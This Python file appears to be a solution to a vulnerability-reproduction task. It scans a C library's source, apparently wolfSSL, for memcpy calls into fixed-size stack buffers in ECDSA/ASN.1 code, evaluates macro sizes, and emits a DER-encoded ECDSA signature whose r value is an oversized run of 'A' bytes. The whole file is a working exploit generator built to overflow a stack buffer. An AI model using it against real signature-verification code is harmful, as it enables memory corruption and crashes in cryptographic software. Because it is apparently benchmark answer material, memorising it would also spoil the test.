import os
import re
import tarfile
import ast
from typing import Dict, Optional, List, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        texts = self._load_texts(src_path)

        macros_raw = self._collect_macros_raw(texts)
        macros_val = self._evaluate_macros(macros_raw)

        buf_sizes = self._find_stack_copy_buffer_sizes(texts, macros_val)
        if buf_sizes:
            b = min(buf_sizes)
            overflow_len = max(b + 16, b + 1)
            overflow_len = min(overflow_len, 60000)
        else:
            overflow_len = 20000

        return self._make_ecdsa_sig_der(overflow_len)

    def _load_texts(self, src_path: str) -> List[Tuple[str, str]]:
        out: List[Tuple[str, str]] = []

        def want(name: str) -> bool:
            n = name.lower()
            return n.endswith((".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh", ".s", ".inc", ".inl"))

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if not want(fn):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                        if st.st_size > 2_000_000:
                            continue
                        with open(p, "rb") as f:
                            data = f.read()
                        out.append((p, data.decode("latin1", errors="ignore")))
                    except Exception:
                        continue
            return out

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    name = m.name
                    if not want(name):
                        continue
                    if m.size > 2_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        out.append((name, data.decode("latin1", errors="ignore")))
                    except Exception:
                        continue
        except Exception:
            try:
                with open(src_path, "rb") as f:
                    data = f.read()
                out.append((src_path, data.decode("latin1", errors="ignore")))
            except Exception:
                pass
        return out

    def _strip_comments(self, s: str) -> str:
        s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
        s = re.sub(r"//.*?$", "", s, flags=re.M)
        return s

    def _collect_macros_raw(self, texts: List[Tuple[str, str]]) -> Dict[str, str]:
        raw: Dict[str, str] = {}
        for _, txt in texts:
            t = self._strip_comments(txt)
            lines = t.splitlines()
            i = 0
            while i < len(lines):
                line = lines[i]
                if "#define" not in line:
                    i += 1
                    continue
                m = re.match(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s*(.*)$", line)
                if not m:
                    i += 1
                    continue
                name = m.group(1)
                rest = m.group(2) or ""
                if "(" in name:
                    i += 1
                    continue
                val = rest.rstrip()
                while val.endswith("\\") and i + 1 < len(lines):
                    val = val[:-1] + (lines[i + 1].rstrip())
                    i += 1
                val = val.strip()
                if not val:
                    i += 1
                    continue
                if re.match(r"^[A-Za-z_]\w*\s*\(", val):
                    i += 1
                    continue
                raw[name] = val
                i += 1
        return raw

    def _sanitize_c_expr(self, expr: str) -> str:
        e = expr.strip()
        e = self._strip_comments(e)
        if "?" in e:
            return ""
        e = re.sub(r"\bsizeof\s*\([^)]*\)", "0", e)

        def strip_casts_once(x: str) -> str:
            return re.sub(r"\(\s*[A-Za-z_][A-Za-z0-9_\s\*]*\s*\)", "", x)

        prev = None
        for _ in range(5):
            prev = e
            e = strip_casts_once(e)
            if e == prev:
                break

        e = re.sub(r"(\b0x[0-9A-Fa-f]+|\b\d+)([uUlL]+)\b", r"\1", e)
        e = re.sub(r"\btrue\b", "1", e, flags=re.I)
        e = re.sub(r"\bfalse\b", "0", e, flags=re.I)
        e = e.replace("/", "//")
        e = re.sub(r"\s+", " ", e).strip()
        return e

    def _safe_eval_int(self, expr: str) -> Optional[int]:
        if not expr:
            return None
        try:
            node = ast.parse(expr, mode="eval")
        except Exception:
            return None

        allowed = (
            ast.Expression,
            ast.BinOp,
            ast.UnaryOp,
            ast.Constant,
            ast.Add,
            ast.Sub,
            ast.Mult,
            ast.FloorDiv,
            ast.Mod,
            ast.LShift,
            ast.RShift,
            ast.BitOr,
            ast.BitAnd,
            ast.BitXor,
            ast.Invert,
            ast.USub,
            ast.UAdd,
            ast.ParenExpr if hasattr(ast, "ParenExpr") else ast.AST,
        )

        for n in ast.walk(node):
            if isinstance(n, ast.Name):
                return None
            if isinstance(n, ast.Call):
                return None
            if not isinstance(n, allowed):
                return None
            if isinstance(n, ast.Constant) and not isinstance(n.value, (int, bool)):
                return None

        try:
            v = eval(compile(node, "<expr>", "eval"), {"__builtins__": {}}, {})
        except Exception:
            return None
        if not isinstance(v, int):
            return None
        return int(v)

    def _evaluate_macros(self, raw: Dict[str, str]) -> Dict[str, int]:
        val: Dict[str, int] = {}
        visiting = set()

        ident_re = re.compile(r"\b[A-Za-z_]\w*\b")

        def resolve(name: str) -> Optional[int]:
            if name in val:
                return val[name]
            if name in visiting:
                return None
            expr = raw.get(name)
            if expr is None:
                return None
            visiting.add(name)
            e = self._sanitize_c_expr(expr)
            if not e:
                visiting.remove(name)
                return None

            def repl(m: re.Match) -> str:
                tok = m.group(0)
                if tok == name:
                    return tok
                if tok in val:
                    return str(val[tok])
                if tok in raw:
                    r = resolve(tok)
                    if r is not None:
                        return str(r)
                if tok.lower() in ("defined",):
                    return "0"
                return tok

            for _ in range(8):
                newe = ident_re.sub(repl, e)
                if newe == e:
                    break
                e = newe

            if ident_re.search(e):
                # Unknown identifiers remain
                visiting.remove(name)
                return None

            r = self._safe_eval_int(e)
            visiting.remove(name)
            if r is None:
                return None
            val[name] = r
            return r

        for k in list(raw.keys()):
            resolve(k)
        return val

    def _eval_expr_with_macros(self, expr: str, macros: Dict[str, int]) -> Optional[int]:
        e = self._sanitize_c_expr(expr)
        if not e:
            return None
        ident_re = re.compile(r"\b[A-Za-z_]\w*\b")

        def repl(m: re.Match) -> str:
            tok = m.group(0)
            if tok in macros:
                return str(macros[tok])
            return tok

        for _ in range(8):
            newe = ident_re.sub(repl, e)
            if newe == e:
                break
            e = newe

        if ident_re.search(e):
            return None
        return self._safe_eval_int(e)

    def _find_stack_copy_buffer_sizes(self, texts: List[Tuple[str, str]], macros: Dict[str, int]) -> List[int]:
        sizes: List[int] = []
        copy_re = re.compile(
            r"\b(memcpy|memmove|XMEMCPY|wc_Memcpy|wolfSSL_Memcpy|MEMCPY)\s*\(\s*([A-Za-z_]\w*)\b",
            flags=re.I,
        )

        type_tokens = r"(?:unsigned\s+char|char|byte|uint8_t|u8|BYTE|UINT8|word8|uchar)"
        for _, txt in texts:
            if not re.search(r"(ecdsa|ecdsa_sig|signature|sig|asn1|asn|der)", txt, flags=re.I):
                continue
            t = self._strip_comments(txt)
            for m in copy_re.finditer(t):
                dest = m.group(2)
                if len(dest) <= 0:
                    continue
                start = max(0, m.start() - 5000)
                window = t[start:m.start()]
                decl_re = re.compile(
                    rf"\b{type_tokens}\s+{re.escape(dest)}\s*\[\s*([^\]\r\n;]+)\s*\]\s*;",
                    flags=re.I,
                )
                decls = list(decl_re.finditer(window))
                if not decls:
                    continue
                expr = decls[-1].group(1).strip()
                v = self._eval_expr_with_macros(expr, macros)
                if v is None:
                    continue
                if 8 <= v <= 1_000_000:
                    sizes.append(v)

        if not sizes:
            # Extra heuristic: find small-ish ECDSA-related array sizes
            for _, txt in texts:
                if not re.search(r"(ecdsa|signature|sig|asn1|asn|der)", txt, flags=re.I):
                    continue
                t = self._strip_comments(txt)
                decl_re = re.compile(
                    r"\b(?:unsigned\s+char|byte|uint8_t|u8|BYTE|UINT8)\s+([A-Za-z_]\w*)\s*\[\s*([^\]\r\n;]+)\s*\]\s*;",
                    flags=re.I,
                )
                for dm in decl_re.finditer(t):
                    var = dm.group(1)
                    expr = dm.group(2)
                    if not re.search(r"\b(r|s|sig|signature|rs|der|asn)\b", var, flags=re.I):
                        continue
                    v = self._eval_expr_with_macros(expr, macros)
                    if v is None:
                        continue
                    if 8 <= v <= 8192:
                        sizes.append(v)

        return sizes

    def _der_len(self, n: int) -> bytes:
        if n < 0:
            n = 0
        if n <= 127:
            return bytes([n])
        b = n.to_bytes((n.bit_length() + 7) // 8, "big")
        return bytes([0x80 | len(b)]) + b

    def _der_integer(self, value: bytes) -> bytes:
        if not value:
            value = b"\x00"
        if value[0] & 0x80:
            value = b"\x00" + value
        return b"\x02" + self._der_len(len(value)) + value

    def _der_sequence(self, content: bytes) -> bytes:
        return b"\x30" + self._der_len(len(content)) + content

    def _make_ecdsa_sig_der(self, r_len: int) -> bytes:
        if r_len < 1:
            r_len = 1
        r = b"A" * r_len
        s = b"\x01"
        content = self._der_integer(r) + self._der_integer(s)
        return self._der_sequence(content)